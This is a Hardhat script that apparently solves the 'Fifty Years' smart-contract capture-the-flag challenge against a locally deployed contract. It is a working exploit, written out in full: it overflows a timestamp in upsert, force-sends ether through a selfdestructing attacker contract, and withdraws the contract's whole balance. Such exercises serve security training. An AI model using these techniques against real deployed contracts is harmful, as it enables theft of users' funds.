const { BigNumber } = require("ethers");
const { ethers } = require("hardhat");

async function main() {
  const [deployer, attacker] = await hre.ethers.getSigners();
  const MainContract = await ethers.getContractFactory("FiftyYearsChallenge", deployer);
  const mainContract = await MainContract.deploy(attacker.address, { value: ethers.utils.parseEther("1") });

  // index doesn't matter here
  await mainContract.connect(attacker).upsert(2, BigNumber.from("2").pow("256").sub(86400), { value: "1" });
  await mainContract.connect(attacker).upsert(3, 0, { value: "2" });
  // queue length is 3 now (last index is 2)

  // send 2 wei to the main contract
  const AttackerContract = await ethers.getContractFactory("FiftyYearsAttacker", attacker);
  const attackerContract = await AttackerContract.deploy();
  await attacker.sendTransaction({ to: attackerContract.address, value: "2" });
  await attackerContract.destructAndSend(mainContract.address);

  // withdraw the entire balance
  await mainContract.connect(attacker).withdraw(2);

  console.log("Is complete:", await mainContract.isComplete());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
